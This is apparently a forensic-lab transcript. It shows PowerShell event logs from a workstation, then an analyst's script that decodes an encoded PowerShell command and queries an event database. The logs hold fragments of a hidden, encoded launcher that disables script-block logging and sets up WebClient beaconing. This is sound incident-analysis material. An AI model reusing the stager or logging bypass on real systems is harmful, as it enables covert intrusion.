-Pipeline execution details for command line:             0..255 | ForEach-Object {
-. 
-
-Context Information: 
-	DetailSequence=2
-	DetailTotal=2
-
-	SequenceNumber=11270
-
-	UserId=CORP\pgustavo
-	HostName=ConsoleHost
-	HostVersion=5.1.18362.752
-	HostId=ca33ee8b-7d2f-4343-83bb-33cd9ad23223
-	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQB
-==================================================
-Event ID: evt-00108 | Code: 800 | Host: WS-05.corp.example
-Pipeline execution details for command line:                                 $a9486 = New-Object System.Net.WebClient
-. 
-
-Context Information: 
-	DetailSequence=1
-	DetailTotal=1
-
-	SequenceNumber=11272
-
-	UserId=CORP\pgustavo
-	HostName=ConsoleHost
-	HostVersion=5.1.18362.752
-	HostId=ca33ee8b-7d2f-4343-83bb-33cd9ad23223
-	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYA
-==================================================
-Event ID: evt-00109 | Code: 4103 | Host: WS-05.corp.example
-CommandInvocation(New-Object): "New-Object"
-ParameterBinding(New-Object): name="TypeName"; value="System.Net.WebClient"
-
-
-Context:
-        Severity = Informational
-        Host Name = ConsoleHost
-        Host Version = 5.1.18362.752
-        Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223
-        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbAC
-==================================================
-Event ID: evt-00111 | Code: 800 | Host: WS-05.corp.example
-Pipeline execution details for command line:                                 $script:Headers.GetEnumerator() | % {$a9486.Headers.Add($_.Name, $_.Value)}
-. 
-
-Context Information: 
-	DetailSequence=1
-	DetailTotal=1
-
-	SequenceNumber=11274
-
-	UserId=CORP\pgustavo
-	HostName=ConsoleHost
-	HostVersion=5.1.18362.752
-	HostId=ca33ee8b-7d2f-4343-83bb-33cd9ad23223
-	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhA
-==================================================
-Event ID: evt-00112 | Code: 800 | Host: WS-05.corp.example
-Pipeline execution details for command line:                                 $taskURI = $script:TaskURIs | Get-Random
-. 
-
-Context Information: 
-	DetailSequence=1
-	DetailTotal=1
-
-	SequenceNumber=11276
-
-	UserId=CORP\pgustavo
-	HostName=ConsoleHost
-	HostVersion=5.1.18362.752
-	HostId=ca33ee8b-7d2f-4343-83bb-33cd9ad23223
-	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYA
-[?2004hroot@330dbb2b3463:~# cat << 'EOF' > /tmp/decode.py
-[?2004l[?2004h> import base64
-[?2004l[?2004h> import sqlite3
-[?2004l[?2004h> 
-[?2004l[?2004h> # Decode the powershell payload from HostApplication or message
-[?2004l[?2004h> enc = ("SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQ")
-[?2004l[?2004h> # Let's pad it to be valid base64
-[?2004l[?2004h> padded = enc + "=" * ((4 - len(enc) % 4) % 4)
-[?2004l[?2004h> try:
-[?2004l[?2004h>     decoded = base64.b64decode(padded).decode('utf-16le', errors='ignore')
-[?2004l[?2004h>     print("Decoded:", decoded)
-[?2004l[?2004h> except Exception as e:
-[?2004l[?2004h>     print(e)
-[?2004l[?2004h> 
-[?2004l[?2004h> conn = sqlite3.connect('/root/data/eventlogs.db')
-[?2004l[?2004h> cursor = conn.cursor()
-[?2004l[?2004h> 
-[?2004l[?2004h> # Let's retrieve all unique process GUIDs, images, users involved in PowerShell execution
-[?2004l[?2004h> cursor.execute("""
-[?2004l[?2004h>     SELECT DISTINCT event_id, host, user, image, parent_image, command_line, process_guid 
-[?2004l[?2004h>     FROM events 
-[?2004l[?2004h>     WHERE (image LIKE '%powershell%' OR parent_image LIKE '%powershell%' 
-[?2004l[?2004h>        OR command_line LIKE '%powershell%' OR message LIKE '%powershell%')
-[?2004l[?2004h> """)
-[?2004l[?2004h> print("Powershell processes:")
-[?2004l[?2004h> for r in cursor.fetchall():
-[?2004l[?2004h>     print(r)
-[?2004l[?2004h> EOF
-[?2004l[?2004hroot@330dbb2b3463:~# python3 /tmp/decode.py
-[?2004lDecoded: IF($PSVErsIoNTaBLe.PSVERSIOn.MAJoR -Ge 3){$57af0=[reF].AsSEMBlY.GEtTyPe('System.Management.Automation.Utils')."GETFIe`Ld"('cachedGroupPolicySettings','N'+'onPublic,Static');If($57af0){$48ac6=$57Af0.GEtVaLue($nuLl);If($48Ac6['Scrip
-Powershell processes:
-('evt-00019', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00020', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00021', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00022', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00023', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00024', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00025', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00026', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00027', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00030', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00031', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00032', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00033', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00034', 'WS-05.corp.example', '', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00088', 'WS-05.corp.example', 'CORP\\pgustavo', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00099', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00100', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00101', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00103', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00105', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00108', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00109', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00110', 'WS-05.corp.example', '', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00111', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00112', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00113', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00114', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00118', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00119', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00129', 'WS-05.corp.example', 'CORP\\pgustavo', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00180', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00181', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00182', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00183', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00184', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00185', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00186', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00187', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00188', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00190', 'WS-05.corp.example', '', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00191', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00192', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00193', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00194', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00195', 'WS-05.corp.example', 'CORP\\pgustavo', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00238', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00239', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00240', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00241', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00242', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00243', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00244', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00245', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00246', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00247', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00248', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00249', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00250', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00251', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00252', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00253', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00254', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00255', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00257', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00258', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00259', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00261', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00262', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00263', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00264', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00265', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00266', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00267', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00268', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00269', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00270', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00280', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00281', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00282', 'WS-05.corp.example', '', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00283', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00284', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00286', 'WS-05.corp.example', '', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00287', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00288', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00289', 'WS-05.corp.example', '', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00290', 'WS-05.corp.example', '', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00291', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00292', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00294', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00295', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00296', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00298', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00299', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00300', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00302', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00303', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00304', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00306', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00307', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00308', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00310', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00311', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00312', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00314', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00315', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00316', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00318', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00319', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00320', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00322', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00323', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00324', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00326', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00327', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00328', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00330', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00331', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00332', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00334', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00335', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00336', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00338', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00339', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00340', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00342', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00343', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00344', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00346', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00347', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00348', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00350', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00351', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00352', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00354', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00355', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00356', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00358', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00359', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00360', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00362', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00363', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00364', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00366', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00367', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00368', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00370', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00371', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00372', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00374', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00375', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00376', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00378', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00379', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00380', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00382', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00383', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00384', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00386', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00387', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00388', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00390', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00391', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00392', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00394', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00395', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00396', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00398', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00399', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00400', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00402', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00403', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00404', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00406', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00407', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00408', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00410', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00411', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00412', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00414', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00415', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00416', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00417', 'WS-05.corp.example', 'pgustavo', '', '', '', None)
-('evt-00418', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00419', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00427', 'WS-05.corp.example', 'CORP\\pgustavo', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00428', 'WS-05.corp.example', 'CORP\\pgustavo', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00440', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00441', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00442', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00443', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00444', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00445', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00446', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00447', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00448', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00449', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00450', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00453', 'WS-05.corp.example', '', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00454', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00455', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00468', 'WS-05.corp.example', 'CORP\\pgustavo', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00472', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00473', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00474', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00475', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00476', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00477', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00478', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00479', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00480', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00491', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00492', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00493', 'WS-05.corp.example', '', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00495', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00496', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00497', 'WS-05.corp.example', 'CORP\\pgustavo', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00508', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00509', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00510', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00511', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00512', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00513', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00514', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00515', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00516', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00517', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00518', 'WS-05.corp.example', '', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00519', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00520', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00521', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00529', 'WS-05.corp.example', 'CORP\\pgustavo', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00553', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00554', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00555', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00556', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00557', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00558', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00559', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00560', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00561', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00564', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00565', 'WS-05.corp.example', '', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00566', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00567', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00568', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00580', 'WS-05.corp.example', 'CORP\\pgustavo', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
